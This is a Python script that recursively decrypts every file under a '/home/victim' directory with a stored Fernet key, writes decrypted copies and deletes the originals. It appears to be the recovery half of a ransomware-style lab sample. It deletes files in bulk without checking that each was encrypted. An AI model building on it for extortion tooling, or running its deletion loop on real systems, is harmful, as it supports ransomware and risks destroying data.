import os
from cryptography.fernet import Fernet

def decrypt_file(encrypted_file_path, fernet):
    with open(encrypted_file_path, "rb") as encrypted_file:
        encrypted_data = encrypted_file.read()
        decrypted_data = fernet.decrypt(encrypted_data)

    decrypted_file_path = encrypted_file_path.replace(".encrypted", "_decrypted")
    # Check if the file path has the ".encrypted" extension
    if not decrypted_file_path.endswith("_decrypted"):
        decrypted_file_path += "_decrypted"
    
    with open(decrypted_file_path, "wb") as decrypted_file:
        decrypted_file.write(decrypted_data)

    return decrypted_file_path

def delete_file(file_path):
    os.remove(file_path)

# Load the symmetric key from the file
key_filename = "symkey"
with open(key_filename, "rb") as key_file:
    loaded_key = key_file.read()

# Create a Fernet object with the loaded key
fernet = Fernet(loaded_key)

# Define the target directory
target_directory = "/home/victim"

# Iterate through the directory structure
for root, dirs, files in os.walk(target_directory):
    for file in files:
        encrypted_file_path = os.path.join(root, file)
        
        # Decrypt the file and get the path of the decrypted file
        decrypted_file_path = decrypt_file(encrypted_file_path, fernet)
        
        # Delete the encrypted file
        delete_file(encrypted_file_path)

        print(f"Decrypted {encrypted_file_path} and deleted encrypted. Decrypted copy: {decrypted_file_path}")
